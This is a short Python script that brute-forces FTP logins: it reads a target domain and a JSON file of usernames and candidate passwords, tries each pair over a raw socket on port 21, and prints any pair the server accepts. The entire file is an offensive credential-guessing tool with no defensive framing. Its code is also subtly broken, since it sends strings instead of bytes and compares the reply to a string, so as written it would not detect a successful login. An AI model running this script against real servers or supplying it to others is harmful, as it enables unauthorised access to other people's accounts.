import socket
import json
import configparser
import argparse

params = configparser.ConfigParser()
params.read('params.ini')


def ftpconnect(username, password, ftp_domain):
    """
    ftp connection function
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # print "Testing [User]: " + username + " [Password]: " + password
    print(("Testing [User]: " + username + " [Password]: " + password))
    s.connect((ftp_domain, 21))
    data = s.recv(1024)
    s.send('USER ' + username + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + password + '\r\n')
    data = s.recv(3)
    s.send('QUIT\r\n')
    s.close()
    return data


def bruteforce(users_dict, domain):
    for user in users_dict:
        for password in users_dict[user]:
            attempt = ftpconnect(user, password, domain)
            if attempt == "230":
                print(' ============ ')
                print(("[Found] " + user + ":" + password))
                print('------------------------------------------- ')

def main():
    parser = argparse.ArgumentParser()

    # ftp domain
    parser.add_argument('-domain', help='Server')

    args = parser.parse_args()

    if not args.domain:
        print('You must define an FTP domain')
        domain = input('Domain: ')
    else:
        domain = args.domain

    if params['FTP']['users_pass'] == '':
        print('You must define user/pass JSON file')
        filename = input('Filename: ')
    else:
        filename = params['FTP']['users_pass']

    users_dict = json.load(open(filename, 'r'))

    bruteforce(users_dict, domain)


if __name__=="__main__":
    main()

